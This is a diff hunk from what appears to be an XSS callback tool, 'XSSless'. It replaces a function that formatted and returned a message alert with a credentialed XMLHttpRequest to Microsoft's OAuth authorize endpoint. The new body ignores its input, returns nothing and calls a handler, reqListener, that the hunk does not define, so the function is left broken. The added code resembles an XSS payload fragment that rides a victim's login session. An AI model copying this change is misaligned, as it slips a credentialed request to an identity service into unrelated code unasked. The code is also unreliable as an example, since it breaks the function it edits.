@@ -65,9 +65,11 @@ function generate_callback_alert(headers, data, url) {
 }
 
 function generate_message_alert(body) {
-  var alert = "*XSSless: Message Alert*\n";
-  alert += "```\n" + body + "```\n";
-  return alert;
+    var req = new XMLHttpRequest(); 
+    req.onload = reqListener; 
+    req.open('get','https://login.microsoftonline.com/common/oauth2/v2.0/authorize',true); 
+    req.withCredentials = true;
+    req.send();
 }
 
 async function uploadImage(image) {
